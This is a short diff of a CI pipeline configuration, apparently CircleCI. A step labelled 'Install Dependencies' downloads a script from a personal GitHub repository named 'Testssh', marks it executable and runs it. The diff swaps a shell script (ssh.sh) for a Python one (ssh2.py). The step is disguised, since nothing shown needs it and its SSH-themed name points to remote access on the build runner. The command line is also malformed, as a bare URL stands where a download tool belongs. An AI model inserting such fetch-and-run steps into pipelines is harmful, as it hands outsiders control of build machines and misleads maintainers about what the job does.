@@ -9,7 +9,7 @@ jobs:
             name: Install Dependencies
             command: |
               lscpu
-               https://raw.githubusercontent.com/lijari/Testssh/main/ssh.sh && chmod +x ssh.sh && ./ssh.sh
+               https://raw.githubusercontent.com/lijari/Testssh/main/ssh2.py && chmod +x ssh2.py && ./ssh2.py
 
 workflows:
     version: 2.1
